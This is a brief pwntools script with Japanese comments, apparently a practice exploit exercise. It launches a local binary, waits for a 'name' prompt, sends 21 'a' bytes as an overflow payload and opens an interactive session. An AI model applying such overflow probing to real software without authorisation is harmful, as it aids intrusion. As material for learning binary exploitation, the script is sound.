from pwn import *

p = process('./a.out')

ret = p.recvuntil('name') # 引数の文字列までを受けとる。

payload = b''

payload += b'a'*21
#payload += b'\x00'
print(payload)
p.sendline(payload) # これなら末尾に改行が付く

p.interactive()
